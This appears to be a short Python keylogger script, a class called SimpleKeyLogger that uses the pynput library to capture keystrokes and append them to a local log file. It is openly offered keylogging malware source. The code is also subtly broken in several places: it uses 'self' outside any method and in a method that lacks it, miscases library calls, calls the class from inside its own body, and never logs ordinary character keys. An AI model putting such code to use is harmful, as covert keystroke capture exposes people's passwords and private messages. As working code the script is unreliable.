import pynput.keyboard


class SimpleKeyLogger:
    def __init__(self):
        self.logger = ""

    def append_to_log(self, key_strike):
        self.logger = self.logger + key_strike
        with open("log.txt", "a+", encoding="utf-8") as new_file:
            new_file.write(self.logger)
            # print(self.logger)

    self.logger = ""

    def evaluate_keys(self, key):
        try:
            Pressed_key = str(key.char)
        except AttributeError:
            if key == key.space:
                Pressed_key = " "
            else:
                Pressed_key = " " + str(key) + " "
                self.append_to_log(Pressed_key)

    def start(start):
        keyboard_listener = pynput.keyboard.listener(on_press=self.evaluate_keys)
        with keyboard_listener:
            self.logger = ""
            keyboard_listener.Join()

    SimpleKeyLogger().start()
